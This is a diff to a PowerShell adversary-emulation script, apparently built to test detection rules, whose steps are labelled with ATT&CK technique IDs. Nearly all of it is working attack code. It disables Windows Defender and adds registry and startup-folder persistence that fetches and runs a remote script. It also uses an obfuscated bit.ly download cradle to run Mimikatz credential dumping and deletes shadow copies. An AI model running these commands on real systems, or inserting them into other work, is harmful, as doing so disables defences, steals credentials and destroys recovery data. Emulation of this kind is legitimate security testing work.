@@ -77,7 +77,8 @@ Start-Sleep 10
 Write-Host -ForegroundColor Cyan "`n`nStarting defense evasion step"
 Write-Host "Initiating Defense Evasion - T1089 - Disabling Security Tools"
 Write-Host "Disabling Defender..."
-powershell.exe -Win N -exec bypass -nop -command "Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -m $n"
+$cmd = "Set-MpPreference -DisableRealtimeMonitoring `$true; Start-Sleep -m $n"
+powershell.exe -Win N -exec bypass -nop -command $cmd
 sc config WinDefend start= disabled
 sc stop WinDefend
 
@@ -114,7 +115,7 @@ Start-Sleep 2
 Write-Host "Adding T1547.001 - Registry Run Key w/ Fileless Powershell Command"
 $subcmd = 'powershell.exe -command "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`");"'
 $cmd = @"
-set-itemproperty HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce "NextRun" $subcmd
+set-itemproperty HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce "NextRun" '$subcmd'
 Start-Sleep -m $n
 "@
 powershell.exe -Win N -exec bypass -nop -command $cmd
@@ -123,15 +124,16 @@ powershell.exe -Win N -exec bypass -nop -command $cmd
 #Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore
 
 Write-Host "Adding T1547.009 - Malicious Shortcut Link Persistence"
-$cmd = @"
-`$Target = "C:\Windows\System32\calc.exe"
-`$ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk"
-`$WScriptShell = New-Object -ComObject WScript.Shell
-`$Create = `$WScriptShell.CreateShortcut(`$ShortcutLocation)
-`$Create.TargetPath = `$Target
-`$Create.Save()
+$cmd = @'
+$Target = "C:\Windows\System32\calc.exe"
+$ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk"
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Create = $WScriptShell.CreateShortcut($ShortcutLocation)
+$Create.TargetPath = $Target
+$Create.Save()
+'@
+$cmd += "`nStart-Sleep -m $n"
 Start-Sleep -m $n
-"@
 powershell.exe -Win N -exec bypass -nop -command $cmd
 
 #Start-Sleep 2
@@ -150,7 +152,7 @@ Start-sleep 2
 Start-Sleep 10
 
 Write-Host "Testing Persistence by executing T1059.001 - Powershell Command From Registry Key"
-$Cmd = 'Write-Host -ForegroundColor Red "Mess with the Best, Die like the rest!"; Start-Sleep -m $n'
+$Cmd = "Write-Host -ForegroundColor Red 'Mess with the Best, Die like the rest!'; Start-Sleep -m $n"
 $EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($Cmd))
 reg.exe add "HKEY_CURRENT_USER\Software\Classes\RedTeamTest" /v RT /t REG_SZ /d "V3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAiTWVzcyB3aXRoIHRoZSBCZXN0LCBEaWUgbGlrZSB0aGUgcmVzdCEi" /f
 $cmd = @"
@@ -178,19 +180,20 @@ powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githu
 
 
 Write-Host "Initiating T1059.001 - Powershell Execution of Mimikatz w/ Obfuscation"
-$cmd = @"
+$cmd = @'
 (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');
-IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]`$_})))
+IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
 (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');
-[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]`$_}))).InvokeReturnAsIs()
+[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
 Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';
 SI Variable:/0W 'Net.WebClient';
 Set-Item Variable:\gH 'Default_File_Path.ps1';
 ls _-*;
-Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{`$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
+Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
 Invoke-Mimikatz -DumpCreds 
-Start-Sleep -m $n
-"@
+'@
+$cmd += "`nStart-Sleep -m $n"
+
 powershell.exe -Win N -exec bypass -nop -command $cmd
 
 Start-Sleep 10
@@ -235,12 +238,12 @@ vssadmin.exe delete shadows /All /Shadow=$n /quiet
 Write-Host "Testing Rule: Wallpaper Defacement"
 Write-Host "[ATT&CK T1491 - Impact - Defacement: Internal Defacement](https://attack.mitre.org/techniques/T1491)"
 Write-Host "(Impact-T1491) Possible defacement - Wallpaper was changed via commandline"
-$cmd = @"
-`$oldwallpaper = Get-ItemProperty "HKCU:\Control Panel\Desktop" | select WallPaper -ExpandProperty wallpaper
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d `$oldwallpaper /f
+$cmd = @'
+$oldwallpaper = Get-ItemProperty "HKCU:\Control Panel\Desktop" | select WallPaper -ExpandProperty wallpaper
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d $oldwallpaper /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
-Start-Sleep -m $n
-"@
+'@
+$cmd += "`nStart-Sleep -m $n"
 powershell.exe -Win N -exec bypass -nop -command $cmd
 
 
